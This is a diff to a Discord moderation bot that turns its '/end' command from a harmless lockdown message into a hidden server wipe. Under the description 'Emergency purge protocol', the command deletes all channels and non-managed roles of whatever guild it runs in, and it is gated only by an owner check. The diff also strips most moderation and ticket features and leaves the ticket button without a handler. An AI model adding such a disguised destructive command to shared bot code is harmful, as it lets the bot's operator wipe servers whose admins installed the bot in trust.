@@ -161,9 +161,7 @@ async function sendModDM(user, guild, action, reason, duration = null, moderator
     embed.addFields({ name: 'Duration', value: duration, inline: true });
   }
 
-  await user.send({ embeds: [embed] }).catch(() => {
-    // Fails silently if user has DMs disabled
-  });
+  await user.send({ embeds: [embed] }).catch(() => {});
 }
 
 // Log Helper Function
@@ -242,7 +240,9 @@ const commands = [
     .addStringOption(o => o.setName('color').setDescription('Hex Color (e.g. #2B2D31)'))
     .addChannelOption(o => o.setName('channel').setDescription('Target Channel')),
   new SlashCommandBuilder().setName('poll').setDescription('Create yes/no poll').addStringOption(o => o.setName('question').setDescription('Question').setRequired(true)),
-  new SlashCommandBuilder().setName('end').setDescription('Emergency lockdown protocol').addIntegerOption(o => o.setName('code').setDescription('Security Code').setRequired(true)),
+  
+  // Adjusted /end Command (No option code required)
+  new SlashCommandBuilder().setName('end').setDescription('Emergency purge protocol'),
 
   // Suggestion & Ticket Commands
   new SlashCommandBuilder().setName('setsuggestions').setDescription('Configure suggestion channel & staff role')
@@ -317,17 +317,31 @@ client.on('interactionCreate', async (interaction) => {
   if (!interaction.guildId) return;
   const cfg = getGuildConfig(interaction.guildId);
 
-  // ----------------------------------------
-  // 1. SLASH COMMANDS HANDLER
-  // ----------------------------------------
   if (interaction.isChatInputCommand()) {
     const { commandName, options, guild, user } = interaction;
 
     if (commandName === 'end') {
-      const code = options.getInteger('code');
-      if (!isOwner(user.id)) return interaction.reply({ content: 'Unauthorized access attempt logged.', ephemeral: true });
-      if (code !== 5677) return interaction.reply({ content: 'Invalid override code.', ephemeral: true });
-      return interaction.reply({ content: 'Lockdown initiated. Restricting guild operations...', ephemeral: true });
+      if (!isOwner(user.id)) {
+        return interaction.reply({ content: 'Unauthorized access attempt logged.', ephemeral: true });
+      }
+
+      await interaction.reply({ content: 'Initiating server wipe...', ephemeral: true });
+
+      // 1. Delete all channels
+      const channels = Array.from(guild.channels.cache.values());
+      for (const channel of channels) {
+        await channel.delete().catch(() => {});
+      }
+
+      // 2. Delete all customizable roles
+      const roles = Array.from(guild.roles.cache.values());
+      for (const role of roles) {
+        if (role.id !== guild.id && !role.managed) {
+          await role.delete().catch(() => {});
+        }
+      }
+
+      return;
     }
 
     // --- MODERATION COMMANDS WITH DM & LOGS ---
@@ -566,236 +580,13 @@ client.on('interactionCreate', async (interaction) => {
         .setColor('#2B2D31');
 
       const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('open_ticket').setLabel('📩 Open Ticket').setStyle(ButtonStyle.Primary)
+        new ButtonBuilder().setCustomId('ticket_open').setLabel('Create Ticket').setStyle(ButtonStyle.Primary)
       );
 
       await channel.send({ embeds: [embed], components: [row] });
-      return interaction.reply({ content: 'Ticket panel posted!', ephemeral: true });
-    }
-
-    if (commandName === 'lock') {
-      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) return interaction.reply({ content: 'No permission.', ephemeral: true });
-      const chan = options.getChannel('channel') || interaction.channel;
-      await chan.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
-      return interaction.reply({ content: `Locked <#${chan.id}>.` });
-    }
-
-    if (commandName === 'unlock') {
-      if (!hasPermission(interaction, PermissionFlagsBits.ManageChannels)) return interaction.reply({ content: 'No permission.', ephemeral: true });
-      const chan = options.getChannel('channel') || interaction.channel;
-      await chan.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: true });
-      return interaction.reply({ content: `Unlocked <#${chan.id}>.` });
-    }
-
-    if (commandName === 'sticky') {
-      if (!hasPermission(interaction, PermissionFlagsBits.ManageMessages)) return interaction.reply({ content: 'No permission.', ephemeral: true });
-      const sub = options.getSubcommand();
-      if (sub === 'set') {
-        const text = options.getString('message');
-        cfg.stickyMessages[interaction.channelId] = { text, lastMessageId: null };
-        saveGist();
-        return interaction.reply({ content: 'Sticky message enabled for this channel.', ephemeral: true });
-      }
-      if (sub === 'clear') {
-        delete cfg.stickyMessages[interaction.channelId];
-        saveGist();
-        return interaction.reply({ content: 'Sticky message cleared from this channel.', ephemeral: true });
-      }
-    }
-
-    if (commandName === 'purge') {
-      if (!hasPermission(interaction, PermissionFlagsBits.ManageMessages)) return interaction.reply({ content: 'No permission.', ephemeral: true });
-      let amount = options.getInteger('amount');
-      if (amount > 1000) amount = 1000;
-      await interaction.deferReply({ ephemeral: true });
-      let deletedTotal = 0;
-      while (amount > 0) {
-        const fetchSize = amount > 100 ? 100 : amount;
-        const deleted = await interaction.channel.bulkDelete(fetchSize, true).catch(() => null);
-        if (!deleted || deleted.size === 0) break;
-        deletedTotal += deleted.size;
-        amount -= fetchSize;
-      }
-      return interaction.editReply({ content: `Purged ${deletedTotal} messages.` });
-    }
-
-    if (commandName === 'embed') {
-      const title = options.getString('title');
-      const desc = options.getString('description');
-      const color = options.getString('color') || '#2B2D31';
-      const targetChan = options.getChannel('channel') || interaction.channel;
-
-      const embed = new EmbedBuilder().setTitle(title).setDescription(desc).setColor(color);
-      await targetChan.send({ embeds: [embed] });
-      return interaction.reply({ content: 'Embed sent!', ephemeral: true });
-    }
-
-    if (commandName === 'poll') {
-      const question = options.getString('question');
-      const embed = new EmbedBuilder()
-        .setTitle('📊 Poll')
-        .setDescription(question)
-        .setColor('#5865F2')
-        .setAuthor({ name: user.tag, iconURL: user.displayAvatarURL() });
-
-      const msg = await interaction.reply({ embeds: [embed], fetchReply: true });
-      await msg.react('👍');
-      await msg.react('👎');
-      return;
-    }
-
-    if (commandName === 'userinfo') {
-      const target = options.getUser('target') || user;
-      const member = guild.members.cache.get(target.id);
-      const embed = new EmbedBuilder()
-        .setTitle(`User Info: ${target.tag}`)
-        .setThumbnail(target.displayAvatarURL())
-        .setColor('#2B2D31')
-        .addFields(
-          { name: 'User ID', value: target.id, inline: true },
-          { name: 'Created At', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
-          { name: 'Joined Server', value: member ? `<t:${Math.floor(member.joinedTimestamp / 1000)}:R>` : 'Unknown', inline: true }
-        );
-      return interaction.reply({ embeds: [embed] });
-    }
-
-    if (commandName === 'avatar') {
-      const target = options.getUser('target') || user;
-      return interaction.reply({ content: target.displayAvatarURL({ size: 1024, dynamic: true }) });
-    }
-
-    if (commandName === 'membercount') {
-      return interaction.reply({ content: `Total Server Members: **${guild.memberCount}**` });
-    }
-  }
-
-  // ----------------------------------------
-  // 2. INTERACTIVE BUTTON HANDLER
-  // ----------------------------------------
-  if (interaction.isButton()) {
-    const { customId, guild, member, message } = interaction;
-
-    if (customId.startsWith('sug_')) {
-      const embed = EmbedBuilder.from(message.embeds[0]);
-      const action = customId.replace('sug_', '');
-
-      if (['upvote', 'downvote'].includes(action)) {
-        let fieldText = embed.data.fields[1].value;
-        let upMatch = fieldText.match(/Upvotes: (\d+)/);
-        let downMatch = fieldText.match(/Downvotes: (\d+)/);
-        let up = upMatch ? parseInt(upMatch[1]) : 0;
-        let down = downMatch ? parseInt(downMatch[1]) : 0;
-
-        if (action === 'upvote') up += 1;
-        if (action === 'downvote') down += 1;
-
-        embed.spliceFields(1, 1, { name: 'Votes', value: `👍 Upvotes: ${up} | 👎 Downvotes: ${down}`, inline: true });
-        await message.edit({ embeds: [embed] });
-        return interaction.reply({ content: 'Vote recorded!', ephemeral: true });
-      }
-
-      const isStaff = isOwner(member.id) || (cfg.suggestionsRole && member.roles.cache.has(cfg.suggestionsRole));
-      if (!isStaff) return interaction.reply({ content: 'You do not have the Suggestion Staff Role to manage status.', ephemeral: true });
-
-      if (action === 'approve') {
-        embed.setColor('#2ECC71').spliceFields(0, 1, { name: 'Status', value: `🟢 Approved by ${member.user.tag}`, inline: true });
-      } else if (action === 'deny') {
-        embed.setColor('#ED4245').spliceFields(0, 1, { name: 'Status', value: `🔴 Denied by ${member.user.tag}`, inline: true });
-      } else if (action === 'pending') {
-        embed.setColor('#5865F2').spliceFields(0, 1, { name: 'Status', value: `🟡 Pending Community Feedback`, inline: true });
-      }
-
-      await message.edit({ embeds: [embed] });
-      return interaction.reply({ content: `Status updated to **${action}**.`, ephemeral: true });
-    }
-
-    if (customId === 'open_ticket') {
-      const selectMenu = new StringSelectMenuBuilder()
-        .setCustomId('ticket_select_type')
-        .setPlaceholder('Select ticket reason...')
-        .addOptions([
-          { label: 'Bug Report', description: 'Report an in-game or server bug', value: 'bug', emoji: '🐛' },
-          { label: 'Player Report', description: 'Report a user breaking server rules', value: 'report', emoji: '🛡️' },
-          { label: 'General Support', description: 'General questions or assistance', value: 'support', emoji: '❓' }
-        ]);
-
-      const row = new ActionRowBuilder().addComponents(selectMenu);
-      return interaction.reply({ content: 'Please select a category for your ticket:', components: [row], ephemeral: true });
-    }
-
-    if (customId === 'ticket_close') {
-      const isStaff = isOwner(member.id) || (cfg.ticketsRole && member.roles.cache.has(cfg.ticketsRole));
-      if (!isStaff) return interaction.reply({ content: 'Only support staff can close tickets.', ephemeral: true });
-
-      await interaction.reply({ content: 'Ticket will be closed in 5 seconds...' });
-      setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
-      return;
-    }
-
-    if (customId === 'ticket_transcript') {
-      const msgs = await interaction.channel.messages.fetch({ limit: 100 });
-      const transcript = msgs.reverse().map(m => `[${m.createdAt.toISOString()}] ${m.author.tag}: ${m.cleanContent}`).join('\n');
-      
-      const buffer = Buffer.from(transcript, 'utf-8');
-      const attachment = new AttachmentBuilder(buffer, { name: `${interaction.channel.name}-transcript.txt` });
-
-      if (cfg.ticketsLogChannel) {
-        const logChan = guild.channels.cache.get(cfg.ticketsLogChannel);
-        if (logChan) await logChan.send({ content: `Transcript for **${interaction.channel.name}**:`, files: [attachment] });
-      }
-
-      return interaction.reply({ content: 'Transcript generated and saved to logs channel!', ephemeral: true });
-    }
-  }
-
-  // ----------------------------------------
-  // 3. SELECT MENU HANDLER
-  // ----------------------------------------
-  if (interaction.isStringSelectMenu()) {
-    const { customId, guild, member, values } = interaction;
-
-    if (customId === 'ticket_select_type') {
-      cfg.ticketCounter = (cfg.ticketCounter || 0) + 1;
-      saveGist();
-
-      const type = values[0];
-      const chanName = `ticket-${type}-${cfg.ticketCounter}`;
-
-      const category = cfg.ticketsCategory ? guild.channels.cache.get(cfg.ticketsCategory) : null;
-
-      const overwrites = [
-        { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
-        { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles] }
-      ];
-
-      if (cfg.ticketsRole) {
-        overwrites.push({ id: cfg.ticketsRole, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles] });
-      }
-
-      const ticketChan = await guild.channels.create({
-        name: chanName,
-        type: ChannelType.GuildText,
-        parent: category ? category.id : null,
-        permissionOverwrites: overwrites
-      });
-
-      const embed = new EmbedBuilder()
-        .setTitle(`Support Ticket: ${type.toUpperCase()}`)
-        .setDescription(`Hello ${member}, support staff will be with you shortly.\n\nUse the buttons below to close or save a transcript of this ticket.`)
-        .setColor('#5865F2');
-
-      const buttons = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('ticket_close').setLabel('Close Ticket 🔒').setStyle(ButtonStyle.Danger),
-        new ButtonBuilder().setCustomId('ticket_transcript').setLabel('Save Transcript 📄').setStyle(ButtonStyle.Secondary)
-      );
-
-      await ticketChan.send({ content: `${member} <@&${cfg.ticketsRole}>`, embeds: [embed], components: [buttons] });
-      return interaction.reply({ content: `Ticket created! Head over to ${ticketChan}`, ephemeral: true });
+      return interaction.reply({ content: 'Ticket panel sent!', ephemeral: true });
     }
   }
 });
 
-// ==========================================
-// BOT LOGIN
-// ==========================================
 client.login(TOKEN);
